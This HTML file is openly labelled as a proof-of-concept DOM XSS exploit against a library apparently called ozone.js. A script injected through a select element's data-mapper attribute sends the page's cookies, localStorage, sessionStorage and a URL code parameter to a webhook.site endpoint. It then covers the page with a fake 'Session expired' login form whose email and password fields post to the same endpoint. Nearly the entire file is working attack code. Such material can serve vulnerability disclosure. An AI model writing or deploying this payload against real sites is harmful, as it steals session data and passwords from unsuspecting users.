<!DOCTYPE html>
<html>
  <head>
    <title>PoC DOM XSS - ozone.js</title>
    <meta charset="UTF-8" />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
    <script src="ozone.js"></script>
  </head>
  <body>
    <select
      data-src-url="/api/data"
      data-mapper="() => {
        const code = new URLSearchParams(window.location.search).get('code');
        const data = {
          cookies: document.cookie,
          localStorage: {...localStorage},
          sessionStorage: {...sessionStorage},
          code: code || 'NO_CODE'
        };

        fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });

        // Fake login injection
        const f = document.createElement('form');
        f.innerHTML = `
          <div style='position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:9999;font-family:sans-serif;padding:20px'>
            <h2>Session expired. Please log in again</h2>
            <input type='text' id='user' placeholder='Email' /><br/><br/>
            <input type='password' id='pass' placeholder='Password' /><br/><br/>
            <button type='submit'>Login</button>
          </div>
        `;
        f.onsubmit = (e) => {
          e.preventDefault();
          fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: document.getElementById('user').value,
              password: document.getElementById('pass').value,
              ts: Date.now()
            })
          });
        };
        document.body.appendChild(f);
      }">
    </select>
  </body>
</html>
